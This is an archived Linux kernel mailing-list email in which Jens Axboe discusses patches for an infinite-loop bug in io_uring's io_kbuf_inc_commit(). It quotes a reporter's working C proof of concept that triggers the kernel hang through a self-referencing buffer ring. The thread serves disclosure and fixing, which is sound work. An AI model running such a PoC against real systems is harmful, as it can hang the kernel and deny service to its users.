Return-Path: <io-uring+bounces-9363-lists+io-uring=lfdr.de@vger.kernel.org>
X-Original-To: lists+io-uring@lfdr.de
Delivered-To: lists+io-uring@lfdr.de
Received: from am.mirrors.kernel.org (am.mirrors.kernel.org [IPv6:2604:1380:4601:e00::3])
	by mail.lfdr.de (Postfix) with ESMTPS id 6738DB39179
	for <lists+io-uring@lfdr.de>; Thu, 28 Aug 2025 04:08:19 +0200 (CEST)
Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by am.mirrors.kernel.org (Postfix) with ESMTPS id 6AECF1BA8613
	for <lists+io-uring@lfdr.de>; Thu, 28 Aug 2025 02:08:39 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 370BF244684;
	Thu, 28 Aug 2025 02:08:12 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=kernel-dk.20230601.gappssmtp.com header.i=@kernel-dk.20230601.gappssmtp.com header.b="IXCHZ35Q"
X-Original-To: io-uring@vger.kernel.org
Received: from mail-pg1-f174.google.com (mail-pg1-f174.google.com [209.85.215.174])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E3BE93A1DB
	for <io-uring@vger.kernel.org>; Thu, 28 Aug 2025 02:08:07 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.215.174
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1756346892; cv=none; b=e95SVze8OiKHIeZn0yKOEK/beP4Os/svbJcmGYxPEWejA8IwIu0TVq0zSyHvhlqO6S/zod4NdrI/IMotFeeh0/DKndVJmevWkbW2xOxGR5UpBRcc8aWi6o72ltk1oSr7P9SdcnAFu//3h05YTuKSUAW4/tjgg7I3APwvu39VqHA=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1756346892; c=relaxed/simple;
	bh=rx/tAskF0rYUZWHxtOG3MCNKzTQlvNyHfefHXqWdcaE=;
	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
	 In-Reply-To:Content-Type; b=o53SARzFBzJg/x/OOX50NMLAJFrJqcu2+GxqWvLWw/51RFfi5nyuzsaH8hv6+jQLJ9a2V2XyiAHy1UIb+6sWELDsaIj4HNieaII974KMerzkLP8b0YQC5eDFaEpKc61l9yicgZBRkAjNm9hHl2yjTwZmbG0UOlF/n6vCMp2ebhk=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=kernel.dk; spf=pass smtp.mailfrom=kernel.dk; dkim=pass (2048-bit key) header.d=kernel-dk.20230601.gappssmtp.com header.i=@kernel-dk.20230601.gappssmtp.com header.b=IXCHZ35Q; arc=none smtp.client-ip=209.85.215.174
Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=kernel.dk
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=kernel.dk
Received: by mail-pg1-f174.google.com with SMTP id 41be03b00d2f7-b49dcdf018bso347519a12.0
        for <io-uring@vger.kernel.org>; Wed, 27 Aug 2025 19:08:07 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=kernel-dk.20230601.gappssmtp.com; s=20230601; t=1756346887; x=1756951687; darn=vger.kernel.org;
        h=content-transfer-encoding:in-reply-to:content-language:from
         :references:cc:to:subject:user-agent:mime-version:date:message-id
         :from:to:cc:subject:date:message-id:reply-to;
        bh=mYDSvjT3cEmwnzWeaiJzKM+Jdh/81m0/2RJTR2Kywvw=;
        b=IXCHZ35Q1fcMMwaDjH4s6tlmUwo3x0JUxp9zo1pH7Q/W8T5CTNk+CLdcZtl535Tu7D
         Fl2w4p6tSlpzMEh6J+tFdxp9Evz5gtI6T7628pIEcDeDmx4ZnmLzxMobzD0nKhJTwKTY
         YpvuMd+U9nJBsI4+Jim3BsuoIkTc3iI0KFyV0lvj0ZGeYVPUH0uns3NHKVI7gD+fhJ49
         Ht9vobdGJCmzIDLZbqjKkSqitR/ndO7+EKGHAMSOI2FHlPaK1j4r+o9+L1j1umpMLcT7
         3hosvk5AxfcJLqpood5Q1owrBzQQOoIrhxMxlgTFTFqvPGVLbJjXGQze0LWegJmpAWlp
         nUfQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1756346887; x=1756951687;
        h=content-transfer-encoding:in-reply-to:content-language:from
         :references:cc:to:subject:user-agent:mime-version:date:message-id
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=mYDSvjT3cEmwnzWeaiJzKM+Jdh/81m0/2RJTR2Kywvw=;
        b=DTK877E52zSUpQZGxvJD3sil7r32hQHXsqGzWst5Y9pcxARVVTk8UagbBxLGLT/a2h
         NSNbUtDK9a08SVcza9/Ue8dbYdiSrCYRzJUbMpYWpXPeqOOoimGNvCHZREh3w+c86jnq
         eLmaMQ7iSStfSutjUdnmOQYkPpDA88Hc9GwBlr84KpxRAuy1OFwqNfPstTuLBpiZHKYA
         ZWv4d0drcOJGHNR9aMOrE5ttfnAMXe33Nhnv0LfxwKWrs6vSau3ORLIeVWddSdEsQRQW
         zGyNVLEZEfMPYw/Qa2+jlyolX/k/oMvx7e/ww/NkNkSNrxGouOEleUOdWOtT51/k1mEf
         tBtg==
X-Forwarded-Encrypted: i=1; AJvYcCUkUTEcMCtqhnl6l4so5AzQNGY8loUSjSv3IdEQpF3saVMWL8m1kWiPCejmFZMi0F+b+qMuim7uXQ==@vger.kernel.org
X-Gm-Message-State: AOJu0YzdSOamhYGktjogGrJuFdXR6zJu5vV5bliocYIVSFz+t94972nw
	Zyxlgk+/Ft5A7B+ct4hfztuCNSZvg21tJ4VuR2Z66hGCIULJplJ40UQ3qCTGBe5HSGENWzLTrGF
	yTuse
X-Gm-Gg: ASbGncsp5NXWndUHJo1k56ZpyspaV35CaRz7zUSMaaRq/5prApTufWpYJ/H51MOqu+2
	mSkQ1P/WNI1bzjB6cN7jfkZ5AZlQxnB28M2CzArw0ZPXsipjELr/gd/GQez2cFl8mMGtSFBWkjx
	3U/dIbYEWjoccz0wSFmR6Xizm3eM8LUVoit4IAApDkbr43Ek9PUKm1uOUfK3+KhzIgvl0d7rttf
	crXrqekD47qF1JREvXiox4E4ixJm66EDgamqD0OWvLWl+HEu/Uc7XHxWnKTwP1vtyqILLB/UbIe
	m7haj9CflEbZgP4C2K4NCCaUqnfDLec1H1SCNmv1csrS7o1L2CW9+u/w04G1GD5q0qtaHSF+LFD
	x+hhBzw3M0QAkXV/0SB+qi122NeMVB0A=
X-Google-Smtp-Source: AGHT+IFl6J94AI3rHzxBkhf2zRHnmDMMSA1zjxPknzkZZFLqLFZkt91cWyMwHnYr2TTAmNKij0FjUg==
X-Received: by 2002:a17:903:380b:b0:240:6ae4:3695 with SMTP id d9443c01a7336-2462ee0cf11mr269774875ad.4.1756346887093;
        Wed, 27 Aug 2025 19:08:07 -0700 (PDT)
Received: from [192.168.1.150] ([198.8.77.157])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-248d072dc87sm8946255ad.108.2025.08.27.19.08.06
        (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
        Wed, 27 Aug 2025 19:08:06 -0700 (PDT)
Message-ID: <8abaf4ad-d457-422d-9e9e-932cab2588e6@kernel.dk>
Date: Wed, 27 Aug 2025 20:08:05 -0600
Precedence: bulk
X-Mailing-List: io-uring@vger.kernel.org
List-Id: <io-uring.vger.kernel.org>
List-Subscribe: <mailto:io-uring+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:io-uring+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
Subject: Re: [PATCH 2/2] io_uring/kbuf: fix infinite loop in
 io_kbuf_inc_commit()
To: Qingyue Zhang <chunzhennn@qq.com>
Cc: aftern00n@qq.com, io-uring@vger.kernel.org, linux-kernel@vger.kernel.org
References: <4b8eb795-239f-4f46-af4f-7a05056ab516@kernel.dk>
 <tencent_2DEFFED135071FB225305A65D1688B303A09@qq.com>
From: Jens Axboe <axboe@kernel.dk>
Content-Language: en-US
In-Reply-To: <tencent_2DEFFED135071FB225305A65D1688B303A09@qq.com>
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 7bit

On 8/27/25 7:36 PM, Qingyue Zhang wrote:
> On 2025-08-27 21:45 UTC, Jens Axboe wrote:
>> I took a closer look and there's another spot where we should be
>> using READ_ONCE() to get the buffer length. How about something like
>> the below rather than the loop work-around?
>>
>>
>> commit 7f472373b2855087ae2df9dc6a923f3016a1ed21
>> Author: Jens Axboe <axboe@kernel.dk>
>> Date:   Wed Aug 27 15:27:30 2025 -0600
>>
>>     io_uring/kbuf: always use READ_ONCE() to read ring provided buffer lengths
>>     
>>     Since the buffers are mapped from userspace, it is prudent to use
>>     READ_ONCE() to read the value into a local variable, and use that for
>>     any other actions taken. Having a stable read of the buffer length
>>     avoids worrying about it changing after checking, or being read multiple
>>     times.
>>     
>>     Fixes: c7fb19428d67 ("io_uring: add support for ring mapped supplied buffers")
>>     Link: https://lore.kernel.org/io-uring/tencent_000C02641F6250C856D0C26228DE29A3D30A@qq.com/
>>     Reported-by: Qingyue Zhang <chunzhennn@qq.com>
>>     Signed-off-by: Jens Axboe <axboe@kernel.dk>
>>
>> diff --git a/io_uring/kbuf.c b/io_uring/kbuf.c
>> index 81a13338dfab..394037d3f2f6 100644
>> --- a/io_uring/kbuf.c
>> +++ b/io_uring/kbuf.c
>> @@ -36,15 +36,18 @@ static bool io_kbuf_inc_commit(struct io_buffer_list *bl, int len)
>>  {
>>  	while (len) {
>>  		struct io_uring_buf *buf;
>> -		u32 this_len;
>> +		u32 buf_len, this_len;
>>  
>>  		buf = io_ring_head_to_buf(bl->buf_ring, bl->head, bl->mask);
>> -		this_len = min_t(u32, len, buf->len);
>> -		buf->len -= this_len;
>> -		if (buf->len) {
>> +		buf_len = READ_ONCE(buf->len);
>> +		this_len = min_t(u32, len, buf_len);
>> +		buf_len -= this_len;
>> +		if (buf_len) {
>>  			buf->addr += this_len;
>> +			buf->len = buf_len;
>>  			return false;
>>  		}
>> +		buf->len = 0;
>>  		bl->head++;
>>  		len -= this_len;
>>  	}
>> @@ -159,6 +162,7 @@ static void __user *io_ring_buffer_select(struct io_kiocb *req, size_t *len,
>>  	__u16 tail, head = bl->head;
>>  	struct io_uring_buf *buf;
>>  	void __user *ret;
>> +	u32 buf_len;
>>  
>>  	tail = smp_load_acquire(&br->tail);
>>  	if (unlikely(tail == head))
>> @@ -168,8 +172,9 @@ static void __user *io_ring_buffer_select(struct io_kiocb *req, size_t *len,
>>  		req->flags |= REQ_F_BL_EMPTY;
>>  
>>  	buf = io_ring_head_to_buf(br, head, bl->mask);
>> -	if (*len == 0 || *len > buf->len)
>> -		*len = buf->len;
>> +	buf_len = READ_ONCE(buf->len);
>> +	if (*len == 0 || *len > buf_len)
>> +		*len = buf_len;
>>  	req->flags |= REQ_F_BUFFER_RING | REQ_F_BUFFERS_COMMIT;
>>  	req->buf_list = bl;
>>  	req->buf_index = buf->bid;
>> @@ -265,7 +270,7 @@ static int io_ring_buffers_peek(struct io_kiocb *req, struct buf_sel_arg *arg,
>>  
>>  	req->buf_index = buf->bid;
>>  	do {
>> -		u32 len = buf->len;
>> +		u32 len = READ_ONCE(buf->len);
>>  
>>  		/* truncate end piece, if needed, for non partial buffers */
>>  		if (len > arg->max_len) {
> 
> I'm afraid this doesn't solve the problem. the value of buf->len
> could be changed before the function is called. Maybe we shouldn't
> trust it at all?
> 
> Here is a PoC that can still trigger infinite loop:
> 
> #include<liburing.h>
> #include<liburing/io_uring.h>
> #include<netinet/in.h>
> #include<stdint.h>
> #include<sys/socket.h>
> #include<arpa/inet.h>
> #include<stdlib.h>
> int main(){
>     struct io_uring ring;
>     struct io_uring_buf* buf_info;
> 
>     posix_memalign((void**)&buf_info, 4096, 4096);
>     char* buf = malloc(0x1000);
>     struct io_uring_buf_reg reg = {
>         .ring_addr = (uint64_t)buf_info,
>         .ring_entries = 2
>     };
>     buf_info[0].addr = (uint64_t)buf_info;
>     buf_info[0].len = 0x1000;
>     buf_info[0].bid = 0;
>     buf_info[0].resv = 1; // tail
>     io_uring_queue_init(0x10, &ring, IORING_SETUP_NO_SQARRAY);
>     io_uring_register_buf_ring(&ring, &reg, IOU_PBUF_RING_INC);
> 
>     int fds[2];
>     socketpair(AF_UNIX, SOCK_DGRAM, 0, fds);
>     void* send_buf = calloc(1, 32);
>     send(fds[0], send_buf, 32, MSG_DONTWAIT);
> 
>     struct io_uring_sqe* sqe = io_uring_get_sqe(&ring);
>     io_uring_prep_recv(sqe, fds[1], NULL, 0, 0);
>     sqe->flags |=  1<<IOSQE_BUFFER_SELECT_BIT;
>     io_uring_submit(&ring);
>     struct io_uring_cqe* cqe;
>     io_uring_wait_cqe(&ring, &cqe);
> }

Gotcha, yes the READ_ONCE() will ensure we only read it once and it
can't get changed in between in that loop, but this one receives into
the buffer ring.

I don't think there's anything wrong with the looping and stopping at
the other end is of course a safe guard, but couldn't we just abort the
loop if we see a 0 sized buffer? At that point we know the buffer is
invalid, or the kernel is buggy, and it'd be saner to stop at that
point. Something ala:


diff --git a/io_uring/kbuf.c b/io_uring/kbuf.c
index 394037d3f2f6..19a8bde5e1e1 100644
--- a/io_uring/kbuf.c
+++ b/io_uring/kbuf.c
@@ -42,7 +42,8 @@ static bool io_kbuf_inc_commit(struct io_buffer_list *bl, int len)
 		buf_len = READ_ONCE(buf->len);
 		this_len = min_t(u32, len, buf_len);
 		buf_len -= this_len;
-		if (buf_len) {
+		/* Stop looping for invalid buffer length of 0 */
+		if (buf_len || !this_len) {
 			buf->addr += this_len;
 			buf->len = buf_len;
 			return false;

-- 
Jens Axboe

